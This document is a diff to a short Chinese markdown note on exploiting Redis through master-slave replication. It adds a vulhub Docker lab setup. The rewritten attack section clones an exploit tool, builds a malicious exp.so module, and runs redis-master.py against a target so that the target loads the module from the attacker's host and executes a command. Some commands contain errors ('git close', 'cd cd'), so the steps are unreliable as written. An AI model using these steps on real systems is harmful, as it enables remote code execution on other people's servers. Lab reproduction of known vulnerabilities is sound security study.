@@ -1,7 +1,7 @@
 ## Redis基于主从复制的RCE利用方式
 **参考：**
-- https://mp.weixin.qq.com/s/cOdCbO17Jq_J1XnpsxplZg
-- https://paper.seebug.org/975/
+
+- https://github.com/vulhub/vulhub/tree/master/redis/4-unacc
 
 ### 环境搭建
 
@@ -17,13 +17,23 @@ cd src
 ./redis-server /root/redis-5.0.0.0/redis.conf
 ```
 
+vulhub:
+
+```bash
+url：https://github.com/vulhub/vulhub/tree/master/redis/4-unacc
+docker-compose up -d
+```
+
+
 
 ### 攻击
+
 下载脚本并攻击
 ```bash
-git close https://github.com/Ridter/redis-rce
-cd redis-rce
-python3 redis-rce.py -r 127.0.0.1 -L 127.0.0.1 -f exp_lin.so
+git close https://github.com/vulhub/redis-rogue-getshell
+apt-get install gcc make
+cd cd RedisModulesSDK/exp/
+make
+python redis-master.py -r target-ip -p 6379 -L local-ip -P 8888 -f RedisModulesSDK/exp/exp.so -c "id"
 ```
 ![](/images/19-7-10_SQL_Redis基于主从复制的RCE利用方式_1.png)
-![](/images/19-7-10_SQL_Redis基于主从复制的RCE利用方式_2.png)
